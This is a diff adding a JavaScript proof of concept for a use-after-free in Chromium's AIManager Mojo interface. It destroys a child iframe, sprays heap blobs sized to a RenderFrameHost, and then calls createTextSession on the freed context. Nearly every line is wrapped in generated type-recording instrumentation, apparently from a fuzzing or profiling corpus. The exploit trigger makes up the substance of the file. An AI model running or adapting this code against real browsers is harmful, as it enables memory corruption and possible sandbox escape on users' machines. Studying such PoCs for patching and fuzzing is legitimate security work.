@@ -1,0 +1,251 @@
+var Inst0 = 0;
+var Inst1 = 0;
+var Inst2 = 0;
+var Inst3 = 0;
+var Inst4 = 0;
+var Inst5 = 0;
+var Inst6 = 0;
+var Inst7 = 0;
+var Inst8 = 0;
+var Inst9 = 0;
+var Inst10 = 0;
+var Inst11 = 0;
+var Inst12 = 0;
+var Inst13 = 0;
+var Inst14 = 0;
+var Inst15 = 0;
+var Inst16 = 0;
+var Inst17 = 0;
+var Inst18 = 0;
+var Inst19 = 0;
+var Inst20 = 0;
+var Inst21 = 0;
+var Inst22 = 0;
+var Inst23 = 0;
+var Inst24 = 0;
+var Inst25 = 0;
+var Inst26 = 0;
+var Inst27 = 0;
+var Inst28 = 0;
+var Inst29 = 0;
+var Inst30 = 0;
+var Inst31 = 0;
+var Inst32 = 0;
+var Inst33 = 0;
+var Inst34 = 0;
+var Inst35 = 0;
+var Inst36 = 0;
+var Inst37 = 0;
+var Inst38 = 0;
+var Inst39 = 0;
+var Inst40 = 0;
+var Inst41 = 0;
+var Inst42 = 0;
+var Inst43 = 0;
+var Inst44 = 0;
+var Inst45 = 0;
+var Inst46 = 0;
+var Inst47 = 0;
+var Inst48 = 0;
+var Inst49 = 0;
+var Inst50 = 0;
+var Inst51 = 0;
+var Inst52 = 0;
+var Inst53 = 0;
+var Inst54 = 0;
+var Inst55 = 0;
+var Inst56 = 0;
+var Inst57 = 0;
+var Inst58 = 0;
+var Inst59 = 0;
+var Inst60 = 0;
+var Inst61 = 0;
+var Inst62 = 0;
+var Inst63 = 0;
+var Inst64 = 0;
+var Inst65 = 0;
+var Inst66 = 0;
+var Inst67 = 0;
+var Inst68 = 0;
+var Inst69 = 0;
+var Inst70 = 0;
+var Inst71 = 0;
+var Inst72 = 0;
+var Inst73 = 0;
+var Inst74 = 0;
+var Inst75 = 0;
+var Inst76 = 0;
+var Inst77 = 0;
+var Inst78 = 0;
+var Inst79 = 0;
+var Inst80 = 0;
+var Inst81 = 0;
+var Inst82 = 0;
+var Inst83 = 0;
+var Inst84 = 0;
+var Inst85 = 0;
+var Inst86 = 0;
+var Inst87 = 0;
+var Inst88 = 0;
+var Inst89 = 0;
+var Inst90 = 0;
+var Inst91 = 0;
+var Inst92 = 0;
+var Inst93 = 0;
+var Inst94 = 0;
+var Inst95 = 0;
+var Inst96 = 0;
+var Inst97 = 0;
+var Inst98 = 0;
+var Inst99 = 0;
+var Inst100 = 0;
+var Inst101 = 0;
+var Inst102 = 0;
+ 
+function _TypeOfArray(a) {
+	let number = true;	
+	let string = true;
+	for (let i = 0; i < a.length; i++) {
+		if (number && (typeof a[i]) != "number") {
+			number = false;	
+		}
+		if (string && (typeof a[i]) != "string") {
+			string = false;	
+		}
+		if (!number && !string)
+			break;
+	}
+	if (number)
+		return "number";
+	else if (string)
+		return "string";
+	else
+		return "any";
+}
+
+function _TypeIsEqual(t1, t2) {
+	return JSON.stringify(t1) === JSON.stringify(t2);
+}
+
+function _TypeOf(a, step) {
+	var t;
+	var type = Object.prototype.toString.call(a).slice(8, -1).toLowerCase();	
+	if (type == "array") {
+		t = {type : type, extra: {elemType: _TypeOfArray(a)}};
+	} else if (type == "object") {
+		let shape = [];
+        if (step === undefined || step > 0) {
+            let keys = Object.keys(a);
+            let length = Math.min(100, keys.length);
+		    for (let i = 0; i < length; i++) {
+			    shape.push([keys[i], _TypeOf(a[keys[i]], step === undefined ? 1 : step - 1)]);	
+		    }
+        }
+		t = {type : type, extra: {shape: shape}};
+	} else {
+		t = {type : type};
+	} 
+	return t;
+}
+
+function _RecordType(loc, a) {
+	var t = _TypeOf(a);
+    print("~~~TypeInfo:" + loc + ":" + JSON.stringify(t));
+}
+const kChildID = 'AAA';
+try { if (Inst0 <= 1000 && typeof (kChildID) != "undefined") {_RecordType("<6,14,1>",(kChildID)); Inst0++; } } catch(e) {}
+const kRFHSize = 0x15c0;
+try { if (Inst1 <= 1000 && typeof (kRFHSize) != "undefined") {_RecordType("<31,39,2>",(kRFHSize)); Inst1++; } } catch(e) {}
+const kPwnInterfaceName = "pwn";
+try { if (Inst2 <= 1000 && typeof (kPwnInterfaceName) != "undefined") {_RecordType("<57,74,3>",(kPwnInterfaceName)); Inst2++; } } catch(e) {}
+
+try { if (Inst3 <= 1000 && typeof (createChild) != "undefined") {_RecordType("<96,107,5>",(createChild)); Inst3++; } } catch(e) {}
+function createChild(id, src) {
+try { if (Inst4 <= 1000 && typeof (id) != "undefined") {_RecordType("<108,110,5>",(id)); Inst4++; } } catch(e) {}try { if (Inst5 <= 1000 && typeof (src) != "undefined") {_RecordType("<112,115,5>",(src)); Inst5++; } } catch(e) {}
+try { if (Inst7 <= 1000 && typeof (document.createElement) != "undefined") {_RecordType("<135,157,6>",(document.createElement)); Inst7++; } } catch(e) {}try { if (Inst8 <= 1000 && typeof (document) != "undefined") {_RecordType("<135,143,6>",(document)); Inst8++; } } catch(e) {}
+  let iframe = document.createElement('iframe');
+try { if (Inst6 <= 1000 && typeof (iframe) != "undefined") {_RecordType("<126,132,6>",(iframe)); Inst6++; } } catch(e) {}
+try { if (Inst11 <= 1000 && typeof (id) != "undefined") {_RecordType("<184,186,7>",(id)); Inst11++; } } catch(e) {}
+  iframe.id = id;
+try { if (Inst9 <= 1000 && typeof (iframe.id) != "undefined") {_RecordType("<172,181,7>",(iframe.id)); Inst9++; } } catch(e) {}try { if (Inst10 <= 1000 && typeof (iframe) != "undefined") {_RecordType("<172,178,7>",(iframe)); Inst10++; } } catch(e) {}
+try { if (Inst14 <= 1000 && typeof (src) != "undefined") {_RecordType("<204,207,8>",(src)); Inst14++; } } catch(e) {}
+  iframe.src = src;
+try { if (Inst12 <= 1000 && typeof (iframe.src) != "undefined") {_RecordType("<191,201,8>",(iframe.src)); Inst12++; } } catch(e) {}try { if (Inst13 <= 1000 && typeof (iframe) != "undefined") {_RecordType("<191,197,8>",(iframe)); Inst13++; } } catch(e) {}
+try { if (Inst15 <= 1000 && typeof (document.body.appendChild) != "undefined") {_RecordType("<212,237,9>",(document.body.appendChild)); Inst15++; } } catch(e) {}try { if (Inst16 <= 1000 && typeof (document.body) != "undefined") {_RecordType("<212,225,9>",(document.body)); Inst16++; } } catch(e) {}try { if (Inst17 <= 1000 && typeof (document) != "undefined") {_RecordType("<212,220,9>",(document)); Inst17++; } } catch(e) {}try { if (Inst18 <= 1000 && typeof (iframe) != "undefined") {_RecordType("<238,244,9>",(iframe)); Inst18++; } } catch(e) {}
+  document.body.appendChild(iframe);
+try { if (Inst19 <= 1000 && typeof (iframe) != "undefined") {_RecordType("<257,263,10>",(iframe)); Inst19++; } } catch(e) {}
+  return iframe;
+}
+
+try { if (Inst20 <= 1000 && typeof (trigger) != "undefined") {_RecordType("<286,293,13>",(trigger)); Inst20++; } } catch(e) {}
+async function trigger(aiManager) {
+try { if (Inst21 <= 1000 && typeof (aiManager) != "undefined") {_RecordType("<294,303,13>",(aiManager)); Inst21++; } } catch(e) {}
+try { if (Inst22 <= 1000 && typeof (document.body.removeChild) != "undefined") {_RecordType("<310,335,14>",(document.body.removeChild)); Inst22++; } } catch(e) {}try { if (Inst23 <= 1000 && typeof (document.body) != "undefined") {_RecordType("<310,323,14>",(document.body)); Inst23++; } } catch(e) {}try { if (Inst24 <= 1000 && typeof (document) != "undefined") {_RecordType("<310,318,14>",(document)); Inst24++; } } catch(e) {}try { if (Inst25 <= 1000 && typeof (document.getElementById) != "undefined") {_RecordType("<336,359,14>",(document.getElementById)); Inst25++; } } catch(e) {}try { if (Inst26 <= 1000 && typeof (document) != "undefined") {_RecordType("<336,344,14>",(document)); Inst26++; } } catch(e) {}try { if (Inst27 <= 1000 && typeof (kChildID) != "undefined") {_RecordType("<360,368,14>",(kChildID)); Inst27++; } } catch(e) {}
+  document.body.removeChild(document.getElementById(kChildID));
+try { if (Inst28 <= 1000 && typeof (sleep) != "undefined") {_RecordType("<381,386,15>",(sleep)); Inst28++; } } catch(e) {}
+  await sleep(1000);
+
+try { if (Inst30 <= 1000 && typeof (ArrayBuffer) != "undefined") {_RecordType("<412,423,17>",(ArrayBuffer)); Inst30++; } } catch(e) {}try { if (Inst31 <= 1000 && typeof (kRFHSize) != "undefined") {_RecordType("<424,432,17>",(kRFHSize)); Inst31++; } } catch(e) {}
+  let ab = new ArrayBuffer(kRFHSize);
+try { if (Inst29 <= 1000 && typeof (ab) != "undefined") {_RecordType("<403,405,17>",(ab)); Inst29++; } } catch(e) {}
+try { if (Inst33 <= 1000 && typeof (DataView) != "undefined") {_RecordType("<451,459,18>",(DataView)); Inst33++; } } catch(e) {}try { if (Inst34 <= 1000 && typeof (ab) != "undefined") {_RecordType("<460,462,18>",(ab)); Inst34++; } } catch(e) {}
+  let dv = new DataView(ab);
+try { if (Inst32 <= 1000 && typeof (dv) != "undefined") {_RecordType("<442,444,18>",(dv)); Inst32++; } } catch(e) {}
+  for (let i = 0; i < ab.byteLength; i++) {
+try { if (Inst35 <= 1000 && typeof (i) != "undefined") {_RecordType("<477,478,19>",(i)); Inst35++; } } catch(e) {}try { if (Inst36 <= 1000 && typeof (i) != "undefined") {_RecordType("<484,485,19>",(i)); Inst36++; } } catch(e) {}try { if (Inst37 <= 1000 && typeof (ab.byteLength) != "undefined") {_RecordType("<488,501,19>",(ab.byteLength)); Inst37++; } } catch(e) {}try { if (Inst38 <= 1000 && typeof (ab) != "undefined") {_RecordType("<488,490,19>",(ab)); Inst38++; } } catch(e) {}try { if (Inst39 <= 1000 && typeof (i) != "undefined") {_RecordType("<503,504,19>",(i)); Inst39++; } } catch(e) {}
+try { if (Inst40 <= 1000 && typeof (dv.setUint8) != "undefined") {_RecordType("<515,526,20>",(dv.setUint8)); Inst40++; } } catch(e) {}try { if (Inst41 <= 1000 && typeof (dv) != "undefined") {_RecordType("<515,517,20>",(dv)); Inst41++; } } catch(e) {}try { if (Inst42 <= 1000 && typeof (i) != "undefined") {_RecordType("<527,528,20>",(i)); Inst42++; } } catch(e) {}
+    dv.setUint8(i, 0x41);
+  }
+
+try { if (Inst43 <= 1000 && typeof (sprayBlob) != "undefined") {_RecordType("<553,562,23>",(sprayBlob)); Inst43++; } } catch(e) {}try { if (Inst44 <= 1000 && typeof (ab) != "undefined") {_RecordType("<563,565,23>",(ab)); Inst44++; } } catch(e) {}
+  await sprayBlob(ab, 0x100);
+
+try { if (Inst46 <= 1000 && typeof (blink.mojom.AITextSessionPtr) != "undefined") {_RecordType("<604,632,25>",(blink.mojom.AITextSessionPtr)); Inst46++; } } catch(e) {}try { if (Inst47 <= 1000 && typeof (blink.mojom) != "undefined") {_RecordType("<604,615,25>",(blink.mojom)); Inst47++; } } catch(e) {}try { if (Inst48 <= 1000 && typeof (blink) != "undefined") {_RecordType("<604,609,25>",(blink)); Inst48++; } } catch(e) {}
+  let AITextSession = new blink.mojom.AITextSessionPtr();
+try { if (Inst45 <= 1000 && typeof (AITextSession) != "undefined") {_RecordType("<584,597,25>",(AITextSession)); Inst45++; } } catch(e) {}
+try { if (Inst50 <= 1000 && typeof (mojo.InterfacePtrInfo) != "undefined") {_RecordType("<668,689,26>",(mojo.InterfacePtrInfo)); Inst50++; } } catch(e) {}try { if (Inst51 <= 1000 && typeof (mojo) != "undefined") {_RecordType("<668,672,26>",(mojo)); Inst51++; } } catch(e) {}
+  let AITextSession_info = new mojo.InterfacePtrInfo();
+try { if (Inst49 <= 1000 && typeof (AITextSession_info) != "undefined") {_RecordType("<643,661,26>",(AITextSession_info)); Inst49++; } } catch(e) {}
+try { if (Inst53 <= 1000 && typeof (mojo.makeRequest) != "undefined") {_RecordType("<725,741,27>",(mojo.makeRequest)); Inst53++; } } catch(e) {}try { if (Inst54 <= 1000 && typeof (mojo) != "undefined") {_RecordType("<725,729,27>",(mojo)); Inst54++; } } catch(e) {}try { if (Inst55 <= 1000 && typeof (AITextSession_info) != "undefined") {_RecordType("<742,760,27>",(AITextSession_info)); Inst55++; } } catch(e) {}
+  let AITextSession_receiver = mojo.makeRequest(AITextSession_info);
+try { if (Inst52 <= 1000 && typeof (AITextSession_receiver) != "undefined") {_RecordType("<700,722,27>",(AITextSession_receiver)); Inst52++; } } catch(e) {}
+try { if (Inst56 <= 1000 && typeof (AITextSession.ptr.bind) != "undefined") {_RecordType("<766,788,28>",(AITextSession.ptr.bind)); Inst56++; } } catch(e) {}try { if (Inst57 <= 1000 && typeof (AITextSession.ptr) != "undefined") {_RecordType("<766,783,28>",(AITextSession.ptr)); Inst57++; } } catch(e) {}try { if (Inst58 <= 1000 && typeof (AITextSession) != "undefined") {_RecordType("<766,779,28>",(AITextSession)); Inst58++; } } catch(e) {}try { if (Inst59 <= 1000 && typeof (AITextSession_info) != "undefined") {_RecordType("<789,807,28>",(AITextSession_info)); Inst59++; } } catch(e) {}
+  AITextSession.ptr.bind(AITextSession_info);
+  // trigger uaf
+try { if (Inst60 <= 1000 && typeof (aiManager.createTextSession) != "undefined") {_RecordType("<831,858,30>",(aiManager.createTextSession)); Inst60++; } } catch(e) {}try { if (Inst61 <= 1000 && typeof (aiManager) != "undefined") {_RecordType("<831,840,30>",(aiManager)); Inst61++; } } catch(e) {}try { if (Inst62 <= 1000 && typeof (AITextSession_receiver) != "undefined") {_RecordType("<859,881,30>",(AITextSession_receiver)); Inst62++; } } catch(e) {}try { if (Inst63 <= 1000 && typeof (undefined) != "undefined") {_RecordType("<883,892,30>",(undefined)); Inst63++; } } catch(e) {}try { if (Inst64 <= 1000 && typeof (undefined) != "undefined") {_RecordType("<894,903,30>",(undefined)); Inst64++; } } catch(e) {}
+  aiManager.createTextSession(AITextSession_receiver, undefined, undefined, []);
+}
+
+try { if (Inst65 <= 1000 && typeof (poc) != "undefined") {_RecordType("<931,934,33>",(poc)); Inst65++; } } catch(e) {}
+async function poc() {
+try { if (Inst67 <= 1000 && typeof (MojoInterfaceInterceptor) != "undefined") {_RecordType("<964,988,34>",(MojoInterfaceInterceptor)); Inst67++; } } catch(e) {}try { if (Inst68 <= 1000 && typeof (kPwnInterfaceName) != "undefined") {_RecordType("<989,1006,34>",(kPwnInterfaceName)); Inst68++; } } catch(e) {}
+  let interceptor = new MojoInterfaceInterceptor(kPwnInterfaceName, "process");
+try { if (Inst66 <= 1000 && typeof (interceptor) != "undefined") {_RecordType("<946,957,34>",(interceptor)); Inst66++; } } catch(e) {}
+  interceptor.oninterfacerequest = function(e) {
+try { if (Inst71 <= 1000 && typeof (e) != "undefined") {_RecordType("<1065,1066,35>",(e)); Inst71++; } } catch(e) {}
+try { if (Inst72 <= 1000 && typeof (interceptor.stop) != "undefined") {_RecordType("<1075,1091,36>",(interceptor.stop)); Inst72++; } } catch(e) {}try { if (Inst73 <= 1000 && typeof (interceptor) != "undefined") {_RecordType("<1075,1086,36>",(interceptor)); Inst73++; } } catch(e) {}
+    interceptor.stop();
+try { if (Inst75 <= 1000 && typeof (blink.mojom.AIManagerPtr) != "undefined") {_RecordType("<1120,1144,37>",(blink.mojom.AIManagerPtr)); Inst75++; } } catch(e) {}try { if (Inst76 <= 1000 && typeof (blink.mojom) != "undefined") {_RecordType("<1120,1131,37>",(blink.mojom)); Inst76++; } } catch(e) {}try { if (Inst77 <= 1000 && typeof (blink) != "undefined") {_RecordType("<1120,1125,37>",(blink)); Inst77++; } } catch(e) {}try { if (Inst78 <= 1000 && typeof (e.handle) != "undefined") {_RecordType("<1145,1153,37>",(e.handle)); Inst78++; } } catch(e) {}try { if (Inst79 <= 1000 && typeof (e) != "undefined") {_RecordType("<1145,1146,37>",(e)); Inst79++; } } catch(e) {}
+    let aiManager = new blink.mojom.AIManagerPtr(e.handle);
+try { if (Inst74 <= 1000 && typeof (aiManager) != "undefined") {_RecordType("<1104,1113,37>",(aiManager)); Inst74++; } } catch(e) {}
+try { if (Inst80 <= 1000 && typeof (trigger) != "undefined") {_RecordType("<1161,1168,38>",(trigger)); Inst80++; } } catch(e) {}try { if (Inst81 <= 1000 && typeof (aiManager) != "undefined") {_RecordType("<1169,1178,38>",(aiManager)); Inst81++; } } catch(e) {}
+    trigger(aiManager);
+  }
+try { if (Inst69 <= 1000 && typeof (interceptor.oninterfacerequest) != "undefined") {_RecordType("<1023,1053,35>",(interceptor.oninterfacerequest)); Inst69++; } } catch(e) {}try { if (Inst70 <= 1000 && typeof (interceptor) != "undefined") {_RecordType("<1023,1034,35>",(interceptor)); Inst70++; } } catch(e) {}
+try { if (Inst82 <= 1000 && typeof (interceptor.start) != "undefined") {_RecordType("<1189,1206,40>",(interceptor.start)); Inst82++; } } catch(e) {}try { if (Inst83 <= 1000 && typeof (interceptor) != "undefined") {_RecordType("<1189,1200,40>",(interceptor)); Inst83++; } } catch(e) {}
+  interceptor.start();
+try { if (Inst84 <= 1000 && typeof (createChild) != "undefined") {_RecordType("<1213,1224,41>",(createChild)); Inst84++; } } catch(e) {}try { if (Inst85 <= 1000 && typeof (kChildID) != "undefined") {_RecordType("<1225,1233,41>",(kChildID)); Inst85++; } } catch(e) {}
+  createChild(kChildID, 'child.html');
+}
+
+try { if (Inst86 <= 1000 && typeof (child) != "undefined") {_RecordType("<1271,1276,44>",(child)); Inst86++; } } catch(e) {}
+async function child() {
+try { if (Inst88 <= 1000 && typeof (Mojo.createMessagePipe) != "undefined") {_RecordType("<1295,1317,45>",(Mojo.createMessagePipe)); Inst88++; } } catch(e) {}try { if (Inst89 <= 1000 && typeof (Mojo) != "undefined") {_RecordType("<1295,1299,45>",(Mojo)); Inst89++; } } catch(e) {}
+  let pipe = Mojo.createMessagePipe();
+try { if (Inst87 <= 1000 && typeof (pipe) != "undefined") {_RecordType("<1288,1292,45>",(pipe)); Inst87++; } } catch(e) {}
+try { if (Inst90 <= 1000 && typeof (Mojo.bindInterface) != "undefined") {_RecordType("<1324,1342,46>",(Mojo.bindInterface)); Inst90++; } } catch(e) {}try { if (Inst91 <= 1000 && typeof (Mojo) != "undefined") {_RecordType("<1324,1328,46>",(Mojo)); Inst91++; } } catch(e) {}try { if (Inst92 <= 1000 && typeof (blink.mojom.AIManager.name) != "undefined") {_RecordType("<1343,1369,46>",(blink.mojom.AIManager.name)); Inst92++; } } catch(e) {}try { if (Inst93 <= 1000 && typeof (blink.mojom.AIManager) != "undefined") {_RecordType("<1343,1364,46>",(blink.mojom.AIManager)); Inst93++; } } catch(e) {}try { if (Inst94 <= 1000 && typeof (blink.mojom) != "undefined") {_RecordType("<1343,1354,46>",(blink.mojom)); Inst94++; } } catch(e) {}try { if (Inst95 <= 1000 && typeof (blink) != "undefined") {_RecordType("<1343,1348,46>",(blink)); Inst95++; } } catch(e) {}try { if (Inst96 <= 1000 && typeof (pipe.handle1) != "undefined") {_RecordType("<1371,1383,46>",(pipe.handle1)); Inst96++; } } catch(e) {}try { if (Inst97 <= 1000 && typeof (pipe) != "undefined") {_RecordType("<1371,1375,46>",(pipe)); Inst97++; } } catch(e) {}
+  Mojo.bindInterface(blink.mojom.AIManager.name, pipe.handle1);
+try { if (Inst98 <= 1000 && typeof (Mojo.bindInterface) != "undefined") {_RecordType("<1389,1407,47>",(Mojo.bindInterface)); Inst98++; } } catch(e) {}try { if (Inst99 <= 1000 && typeof (Mojo) != "undefined") {_RecordType("<1389,1393,47>",(Mojo)); Inst99++; } } catch(e) {}try { if (Inst100 <= 1000 && typeof (kPwnInterfaceName) != "undefined") {_RecordType("<1408,1425,47>",(kPwnInterfaceName)); Inst100++; } } catch(e) {}try { if (Inst101 <= 1000 && typeof (pipe.handle0) != "undefined") {_RecordType("<1427,1439,47>",(pipe.handle0)); Inst101++; } } catch(e) {}try { if (Inst102 <= 1000 && typeof (pipe) != "undefined") {_RecordType("<1427,1431,47>",(pipe)); Inst102++; } } catch(e) {}
+  Mojo.bindInterface(kPwnInterfaceName, pipe.handle0, "process");
+}
+
